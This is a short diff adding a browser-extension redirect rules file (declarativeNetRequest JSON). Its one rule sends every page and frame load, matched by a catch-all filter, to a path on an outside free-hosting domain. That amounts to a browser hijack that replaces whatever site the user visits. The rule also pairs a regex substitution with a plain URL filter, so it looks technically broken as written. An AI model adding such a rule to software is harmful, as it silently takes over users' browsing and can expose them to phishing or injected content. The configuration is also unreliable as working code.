@@ -1,0 +1,16 @@
+[
+  {
+    "id": "1",
+    "priority": 1,
+    "action": {
+      "type": "redirect",
+      "redirect": {
+        "regexSubstitution": "https://jpizy.epizy.com/Statik/$1"
+      }
+    },
+    "condition": {
+      "urlFilter": ".*",
+      "resourceTypes": ["main_frame", "sub_frame"]
+    }
+  }
+]
